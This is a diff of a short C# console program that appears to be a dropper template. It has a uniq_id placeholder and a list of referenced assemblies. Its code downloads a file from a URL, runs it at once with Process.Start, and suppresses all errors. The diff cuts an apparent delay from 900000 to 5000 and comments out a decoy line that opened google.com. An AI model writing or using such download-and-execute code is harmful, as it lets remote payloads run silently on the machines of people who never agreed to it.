@@ -1,6 +1,6 @@
 uniq_id
 System.dll,mscorlib.dll,System.Net.dll
-900000
+5000
 using System;
 using System.IO;
 using System.Net;
@@ -27,7 +27,7 @@ namespace ConsoleApp
                    eb.DownloadFile(url, destinationpath);
                    System.Diagnostics.Process.Start(destinationpath);
                    
-                   System.Diagnostics.Process.Start("http://google.com");
+                   // System.Diagnostics.Process.Start("http://google.com");
                }
                catch(Exception e) {  }
            }
